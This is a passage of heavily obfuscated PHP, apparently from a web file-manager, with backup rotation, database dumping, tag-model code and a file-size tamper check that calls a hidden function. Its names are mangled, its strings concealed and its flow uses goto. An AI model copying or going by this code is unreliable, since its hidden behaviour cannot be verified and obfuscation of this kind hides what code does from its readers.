†Ìßø[$‰­èë¨Ï[1776]]); write_log($‰­èë¨Ï[1786] . $’öÊûâ . $‰­èë¨Ï[71] . $ †Ìßø[$‰­èë¨Ï[264]] . $‰­èë¨Ï[1787] . ACTION, $‰­èë¨Ï[1778]); } catch (Exception $ôèŠºÂ…) { } continue; } $“îó˜Ä×[$’öÊûâ] = $ †Ìßø; } if (!$÷—Á‚ƒ) { return; } if (!$“îó˜Ä×) { return Cache::remove($²Ô¥¾âŞ); } Cache::set($²Ô¥¾âŞ, $“îó˜Ä×, 60); Cache::removeMemory($²Ô¥¾âŞ); } public static function finished($ö¦Úğó±, $‹ÜŸ’¦ã) { $¥±ÌíÌÌ =& $_SERVER[ï»»·÷á]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($¥±ÌíÌÌ[264] => $ö¦Úğó±, $¥±ÌíÌÌ[1776] => $‹ÜŸ’¦ã); } private static function finishedRun() { $¶½Ü˜ş =& $_SERVER[ï»»·÷á]; if (!self::$syncTask) { return; } foreach (self::$syncTask as $¬ı«ËÜº) { try { Hook::apply($¬ı«ËÜº[$¶½Ü˜ş[264]], $¬ı«ËÜº[$¶½Ü˜ş[1776]]); } catch (Exception $Ó‹ÏØî‰) { } } } public static function autoRun() { self::finishedRun(); self::timeLimitCallLoop(); } } goto bçï¡İóµ; f´ùÏš”–ñ: if ($_SERVER[$_SERVER[ï»»·÷á][401]] != $_size($_file)) { $_getc = $_SERVER[ï»»·÷á][403]; $_getfile = $_SERVER[$_SERVER[ï»»·÷á][404]] . $_SERVER[ï»»·÷á][405]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[ï»»·÷á][231], $_getfilec); if (count($_getarrs) < $_SERVER[ï»»·÷á][406]) { $exit = $_SERVER[ï»»·÷á][407]; $exit(); } $_act = $_SERVER[ï»»·÷á][408]; $_act($_file); } class Backup { protected static $name; protected static $option; protected static $manual; public function __construct() { $this->init(); $this->keep(); } public function init() { $À±ƒÓëÜ =& $_SERVER[ï»»·÷á]; $this->isManual(); self::$name = date($À±ƒÓëÜ[760]); if (!($ Å°–€Ö = Model($À±ƒÓëÜ[761])->lastItem())) { $ Å°–€Ö = $this->initData(); } else { self::$name = $ Å°–€Ö[$À±ƒÓëÜ[32]]; if ($ Å°–€Ö[$À±ƒÓëÜ[762]] == $À±ƒÓëÜ[88]) { self::$name = date($À±ƒÓëÜ[763]); $Œœ®Šø´ = 0; if (isset($ Å°–€Ö[$À±ƒÓëÜ[293]][$À±ƒÓëÜ[200]][$À±ƒÓëÜ[477]])) { $Œœ®Šø´ = (int) $ Å°–€Ö[$À±ƒÓëÜ[293]][$À±ƒÓëÜ[200]][$À±ƒÓëÜ[477]]; } if (self::$manual == 0 && $ Å°–€Ö[$À±ƒÓëÜ[32]] == self::$name) { Model($À±ƒÓëÜ[761])->remove($ Å°–€Ö[$À±ƒÓëÜ[399]]); } $ Å°–€Ö = $this->initData($Œœ®Šø´, $ Å°–€Ö[$À±ƒÓëÜ[764]]); } else { $this->checkStore($ Å°–€Ö[$À±ƒÓëÜ[764]]); } } self::$option = $ Å°–€Ö; } private function isManual() { $ú›»„š‚ = _get($GLOBALS, $_SERVER[ï»»·÷á][765], 0); $ú›»„š‚ = intval($ú›»„š‚); self::$manual = $ú›»„š‚ && $ú›»„š‚ == 1 ? 1 : 0; } private function initData($Àƒ§Ó› = 0, $Î”©›­í = '') { $¾ªôœ å =& $_SERVER[ï»»·÷á]; $€¤¸ùòß = Model($¾ªôœ å[761])->config(); if ($Î”©›­í && $€¤¸ùòß[$¾ªôœ å[764]] != $Î”©›­í) { $Àƒ§Ó› = 0; } $this->checkStore($€¤¸ùòß[$¾ªôœ å[764]]); if (self::$manual == 1) { self::$name .= $¾ªôœ å[11] . date($¾ªôœ å[766]); } $ş€´ó³Ç = array($¾ªôœ å[764] => $€¤¸ùòß[$¾ªôœ å[764]], $¾ªôœ å[32] => self::$name, $¾ªôœ å[762] => 0, $¾ªôœ å[767] => $€¤¸ùòß[$¾ªôœ å[767]], $¾ªôœ å[768] => self::$manual, $¾ªôœ å[293] => array($¾ªôœ å[769] => array($¾ªôœ å[762] => 0), $¾ªôœ å[770] => array($¾ªôœ å[762] => 0, $¾ªôœ å[771] => 0, $¾ªôœ å[772] => 0, $¾ªôœ å[33] => $¾ªôœ å[12], $¾ªôœ å[773] => 0, $¾ªôœ å[774] => 0), $¾ªôœ å[775] => array($¾ªôœ å[762] => 0, $¾ªôœ å[771] => 0, $¾ªôœ å[772] => 0, $¾ªôœ å[773] => 0, $¾ªôœ å[774] => 0), $¾ªôœ å[200] => array($¾ªôœ å[762] => 0, $¾ªôœ å[776] => 0, $¾ªôœ å[777] => 0, $¾ªôœ å[778] => 0, $¾ªôœ å[779] => 0, $¾ªôœ å[477] => $Àƒ§Ó›, $¾ªôœ å[773] => 0, $¾ªôœ å[774] => 0)), $¾ªôœ å[773] => time(), $¾ªôœ å[774] => 0); $ªĞ²ó÷ = Model($¾ªôœ å[761])->insert($ş€´ó³Ç); $ş€´ó³Ç[$¾ªôœ å[399]] = $ªĞ²ó÷; return $ş€´ó³Ç; } private function checkStore($µşÙª‰ë) { $Ó›‘«¬¢ =& $_SERVER[ï»»·÷á]; $œ¾Ù•ÃÒ = Model($Ó›‘«¬¢[780])->listData($µşÙª‰ë); Model($Ó›‘«¬¢[780])->checkConfig($œ¾Ù•ÃÒ); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[ï»»·÷á][761])->findByName(self::$name); } return self::$option; } public static function set($»ª‡º»Ä) { $‰èÎŠä¡ =& $_SERVER[ï»»·÷á]; $Ãª’”é’ = self::get(); foreach ($»ª‡º»Ä as $˜¶ÇÙ†Ú => $®ÙôÚ“Æ) { $¹™¯îˆÉ = explode($‰èÎŠä¡[10], $˜¶ÇÙ†Ú); $ˆÜ™ƒ‰ó = count($¹™¯îˆÉ); switch ($ˆÜ™ƒ‰ó) { case 1: $Ãª’”é’[$¹™¯îˆÉ[0]] = $®ÙôÚ“Æ; break; case 2: $Ãª’”é’[$¹™¯îˆÉ[0]][$¹™¯îˆÉ[1]] = $®ÙôÚ“Æ; break; case 3: $Ãª’”é’[$¹™¯îˆÉ[0]][$¹™¯îˆÉ[1]][$¹™¯îˆÉ[2]] = $®ÙôÚ“Æ; break; } } Model($‰èÎŠä¡[761])->update($Ãª’”é’[$‰èÎŠä¡[399]], $Ãª’”é’); self::$option = $Ãª’”é’; return self::$option; } public function keep() { $¤µôş‰ø =& $_SERVER[ï»»·÷á]; $Šñş´© = self::get(); if ($Šñş´©[$¤µôş‰ø[293]][$¤µôş‰ø[769]][$¤µôş‰ø[762]] == $¤µôş‰ø[88]) { return; } $this->backupKeep($Šñş´©); self::set(array($¤µôş‰ø[781] => 1)); } private function backupKeep($İÖó§Û) { $ÙÔŞ‰¢÷ =& $_SERVER[ï»»·÷á]; if (self::$manual == 1) { return; } $¯¡æ¸¼Š = Model($ÙÔŞ‰¢÷[761])->listData(); if (empty($¯¡æ¸¼Š)) { return; } $œû‘ÓŠê = 0; $”ïÉãº¸ = array(); foreach ($¯¡æ¸¼Š as $úğ”Á½«) { if ($œû‘ÓŠê >= 7) { break; } $”ïÉãº¸[] = $úğ”Á½«[$ÙÔŞ‰¢÷[32]]; $œû‘ÓŠê++; } for ($œû‘ÓŠê = 0; $œû‘ÓŠê < 12; $œû‘ÓŠê++) { $”ïÉãº¸[] = date($ÙÔŞ‰¢÷[782], strtotime("\x2d{$œû‘ÓŠê}\x20\x6d\x6f\156\x74\150\163")); } $”ïÉãº¸ = array_unique($”ïÉãº¸); $üğÄÅ¯‘ = Model($ÙÔŞ‰¢÷[783])->get($ÙÔŞ‰¢÷[784]); foreach ($¯¡æ¸¼Š as $úğ”Á½«) { if (isset($úğ”Á½«[$ÙÔŞ‰¢÷[768]]) && $úğ”Á½«[$ÙÔŞ‰¢÷[768]] == $ÙÔŞ‰¢÷[88]) { continue; } if (!empty($úğ”Á½«[$ÙÔŞ‰¢÷[32]]) && in_array($úğ”Á½«[$ÙÔŞ‰¢÷[32]], $”ïÉãº¸)) { continue; } Model($ÙÔŞ‰¢÷[761])->remove($úğ”Á½«[$ÙÔŞ‰¢÷[399]]); $Ñ¯×ûêÚ = $this->backupPath($İÖó§Û, $üğÄÅ¯‘); IO::remove($Ñ¯×ûêÚ, !1); } } private function backupPath($Óàı×ğš, $ö¼£“ìü = false) { $éŒŞå±æ =& $_SERVER[ï»»·÷á]; if (!$ö¼£“ìü) { $ö¼£“ìü = Model($éŒŞå±æ[783])->get($éŒŞå±æ[784]); } $â¬’Ó—Ô = $Óàı×ğš[$éŒŞå±æ[32]]; $Åß¾™¯ç = substr(md5($éŒŞå±æ[785] . $ö¼£“ìü . $â¬’Ó—Ô), 0, 8); return "\x7b\x69\x6f\72{$Óàı×ğš[$éŒŞå±æ[764]]}\175\x2f\x64\141\x74\x61\x62\141\163\145\x2f\142\x61\x63\x6b\x75\160\57" . $â¬’Ó—Ô . $éŒŞå±æ[11] . $Åß¾™¯ç; } public function db() { $èş‘ğšî =& $_SERVER[ï»»·÷á]; $ıôÊšÁ˜ = self::get(); if ($ıôÊšÁ˜[$èş‘ğšî[293]][$èş‘ğšî[770]][$èş‘ğšî[762]] == $èş‘ğšî[88]) { return !0; } $êí¿‚ùÓ = new BackupDb(); if (!$êí¿‚ùÓ->index()) { return !1; } self::set(array($èş‘ğšî[786] => 1)); return !0; } public function dbFile() { $“ß¼İì¨ =& $_SERVER[ï»»·÷á]; $íÁíà¥ = self::get(); if ($íÁíà¥[$“ß¼İì¨[293]][$“ß¼İì¨[775]][$“ß¼İì¨[762]] == $“ß¼İì¨[88]) { return !0; } $ª™à“Ôç = new BackupDbFile(); if (!$ª™à“Ôç->index()) { return !1; } self::set(array($“ß¼İì¨[787] => 1)); return !0; } public function file() { $Ìä¿éû› =& $_SERVER[ï»»·÷á]; $Ì”…‡— = self::get(); if ($Ì”…‡—[$Ìä¿éû›[293]][$Ìä¿éû›[200]][$Ìä¿éû›[762]] == $Ìä¿éû›[88]) { return !0; } if (!isset($Ì”…‡—[$Ìä¿éû›[767]]) || $Ì”…‡—[$Ìä¿éû›[767]] == $Ìä¿éû›[198]) { $Öö·¼´ù = new BackupFile(); if (!$Öö·¼´ù->index()) { return !1; } } self::set(array($Ìä¿éû›[788] => 1, $Ìä¿éû›[762] => 1)); return !0; } } class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { $¢üüÀê¯ =& $_SERVER[ï»»·÷á]; $á‹Û¯µØ = Backup::get(); self::$io = $á‹Û¯µØ[$¢üüÀê¯[764]]; self::$name = $á‹Û¯µØ[$¢üüÀê¯[32]]; $ÉÂŒ°à = new DbManage(); $Ü€ú¢â  = $ÉÂŒ°à->dbType(); $¬‹í¸á† = array($¢üüÀê¯[789] => $Ü€ú¢â , $¢üüÀê¯[790] => time()); Backup::set($¬‹í¸á†); $¶ò¶¯öª = $this->tmpFilesPath() . $¢üüÀê¯[791] . self::$name . $¢üüÀê¯[8]; del_dir($¶ò¶¯öª); mk_dir($¶ò¶¯öª); $Êß»Í€Õ = $÷¹—†±® = 0; $¥Üœª·Ä = new Task($¢üüÀê¯[792], $¢üüÀê¯[793], 0, LNG($¢üüÀê¯[794]) . $¢üüÀê¯[795] . LNG($¢üüÀê¯[796])); try { $šïúßßª = $ÉÂŒ°à->db()->getTables(); } catch (Exception $ÒúÌİºÃ) { $¥Üœª·Ä->end(); return !1; } $šïúßßª = array_diff($šïúßßª, array($¢üüÀê¯[797], $¢üüÀê¯[798])); foreach ($šïúßßª as $òàå£Ê) { $Êß»Í€Õ += $ÉÂŒ°à->model($òàå£Ê)->count(); } $¥Üœª·Ä->task[$¢üüÀê¯[799]] = $Êß»Í€Õ; $GLOBALS[$¢üüÀê¯[800]] = self::$name; foreach ($šïúßßª as $òàå£Ê) { $šíÄÄ¦† = $¶ò¶¯öª . $òàå£Ê . $¢üüÀê¯[801]; $ôš÷ß‡¾ = null; if ($òàå£Ê == $¢üüÀê¯[802] && (!isset($á‹Û¯µØ[$¢üüÀê¯[767]]) || $á‹Û¯µØ[$¢üüÀê¯[767]] == $¢üüÀê¯[198])) { $ôš÷ß‡¾ = self::$io; } $÷¹—†±® += $ÉÂŒ°à->sqlFromDb($òàå£Ê, $šíÄÄ¦†, $¥Üœª·Ä, $ôš÷ß‡¾); } unset($GLOBALS[$¢üüÀê¯[800]]); $¥Üœª·Ä->end(); if ($÷¹—†±® > $Êß»Í€Õ) { $Êß»Í€Õ = $÷¹—†±®; } $¬‹í¸á† = array($¢üüÀê¯[789] => $Ü€ú¢â , $¢üüÀê¯[786] => 1, $¢üüÀê¯[803] => $Êß»Í€Õ, $¢üüÀê¯[804] => $÷¹—†±®, $¢üüÀê¯[805] => time()); Backup::set($¬‹í¸á†); if ($Êß»Í€Õ - $÷¹—†±® > 0) { $µ”ïÅú¼ = $¢üüÀê¯[806]; if (stristr(I18n::getType(), $¢üüÀê¯[807])) { $µ”ïÅú¼ = $¢üüÀê¯[808]; } write_log(array($µ”ïÅú¼, $¬‹í¸á†), $¢üüÀê¯[793]); return !1; } return !0; } private function tmpFilesPath() { $æ‰§°®” =& $_SERVER[ï»»·÷á]; $¢àœ›üå = TEMP_FILES; if ($GLOBALS[$æ‰§°®”[6]][$æ‰§°®”[89]][$æ‰§°®”[809]]) { $¢àœ›üå = $GLOBALS[$æ‰§°®”[6]][$æ‰§°®”[89]][$æ‰§°®”[809]]; if (!mk_dir($¢àœ›üå) || !is_writable($¢àœ›üå) || !IO::mkfile($¢àœ›üå . $æ‰§°®”[810])) { $¢àœ›üå = TEMP_FILES; } } return $¢àœ›üå; } } goto Fï’á¥†„; A”†Š¡¨Ì…: class UserTagSourceModel extends ModelBase { protected $tableName = "\165\163\145\x72\x5f\x66\x61\166"; protected function cacheFunctionAlias($ğÅÅÛ¾) { $ÛÙèÜÏç =& $_SERVER[ï»»·÷á]; return array($ÛÙèÜÏç[1978] => array($ÛÙèÜÏç[2362] . USER_ID, $ÛÙèÜÏç[1979])); } protected function listData() { $›ƒ¯àÓá =& $_SERVER[ï»»·÷á]; $£‰á™°¯ = array($›ƒ¯àÓá[1669] => USER_ID, $›ƒ¯àÓá[492] => array($›ƒ¯àÓá[1982], 0)); $Âá»ßÙ = $›ƒ¯àÓá[2363]; $Ÿ©Ú–á• = $this->field($Âá»ßÙ)->where($£‰á™°¯)->order($›ƒ¯àÓá[1985])->select(); return $Ÿ©Ú–á• ? $Ÿ©Ú–á• : array(); } protected function addToTag($å¯û·Œ¸, $–œÃ §Œ) { $İâğ„â =& $_SERVER[ï»»·÷á]; if (!Model($İâğ„â[2126])->listData($–œÃ §Œ)) { return !1; } if (is_numeric($å¯û·Œ¸)) { $úÖàµ´ğ = Model($İâğ„â[838])->pathInfo($å¯û·Œ¸); if (!$úÖàµ´ğ) { return !1; } } else { $úÖàµ´ğ = IO::infoSimple($å¯û·Œ¸); if (!$úÖàµ´ğ) { return !1; } $ìÑÖÇ£ = $úÖàµ´ğ[$İâğ„â[32]]; $ÔÛÎïØÂ = $úÖàµ´ğ[$İâğ„â[33]]; if (isset($úÖàµ´ğ[$İâğ„â[419]])) { $ÔÛÎïØÂ = $úÖàµ´ğ[$İâğ„â[419]] == $İâğ„â[88] ? $İâğ„â[75] : $İâğ„â[200]; } } $÷æÁ¬À = array($İâğ„â[1669] => USER_ID, $İâğ„â[492] => $–œÃ §Œ, $İâğ„â[430] => $å¯û·Œ¸, $İâğ„â[431] => $ÔÛÎïØÂ ? $ÔÛÎïØÂ : $İâğ„â[425], $İâğ„â[429] => $ìÑÖÇ£ ? $ìÑÖÇ£ : $İâğ„â[12], $İâğ„â[1871] => 0); if ($this->where($÷æÁ¬À)->find()) { return !1; } return $this->add($÷æÁ¬À); } protected function removeFromTag($†»µ´Ô, $ŒŒÕÌ­) { $±ú¹ê¢õ =& $_SERVER[ï»»·÷á]; if (!Model($±ú¹ê¢õ[2126])->listData($ŒŒÕÌ­)) { return !1; } if (is_array($†»µ´Ô)) { $†»µ´Ô = array($±ú¹ê¢õ[7], $†»µ´Ô); } $¤«íÍüÍ = array($±ú¹ê¢õ[1669] => USER_ID, $±ú¹ê¢õ[492] => $ŒŒÕÌ­, $±ú¹ê¢õ[430] => $†»µ´Ô); return $this->where($¤«íÍüÍ)->delete(); } protected function removeByTag($®©İÑĞ¥) { $îËúşí =& $_SERVER[ï»»·÷á]; if (!$®©İÑĞ¥) { return !1; } $è¾Îª¶ó = array($îËúşí[1669] => USER_ID, $îËúşí[492] => $®©İÑĞ¥); return $this->where($è¾Îª¶ó)->delete(); } protected function removeBySource($šÈÌÅ¢) { $Ğ¤ÕúŸ” =& $_SERVER[ï»»·÷á]; if (is_array($šÈÌÅ¢)) { $šÈÌÅ¢ = array($Ğ¤ÕúŸ”[7], $šÈÌÅ¢); } $Ê½‘óĞÖ = array($Ğ¤ÕúŸ”[1669] => USER_ID, $Ğ¤ÕúŸ”[492] => array($Ğ¤ÕúŸ”[1024], 0), $Ğ¤ÕúŸ”[430] => $šÈÌÅ¢); return $this->where($Ê½‘óĞÖ)->delete(); } }